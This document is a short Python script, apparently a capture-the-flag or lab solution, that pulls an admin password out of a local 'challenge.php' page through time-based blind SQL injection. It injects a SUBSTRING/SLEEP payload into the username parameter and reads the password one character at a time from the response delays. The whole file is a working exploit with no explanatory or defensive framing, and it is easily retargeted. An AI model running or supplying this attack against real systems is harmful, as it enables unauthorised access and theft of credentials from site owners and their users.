import requests
import time

URL = 'http://localhost:8080/challenge.php'

# The known length of the password (or set a reasonable max)
MAX_LEN = 32
password = ''

print('Extracting admin password using time-based blind SQLi...')

for i in range(1, MAX_LEN+1):
    found = False
    for c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
        payload = f"' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1)='{c}', SLEEP(3), 0) -- "
        params = {'username': payload}
        start = time.time()
        requests.get(URL, params=params)
        elapsed = time.time() - start
        if elapsed > 2.5:
            password += c
            print(f"[+] Found character {i}: {c} => {password}")
            found = True
            break
    if not found:
        print(f"[-] No more characters found at position {i}. Stopping.")
        break

print(f"\nExtracted password: {password}") 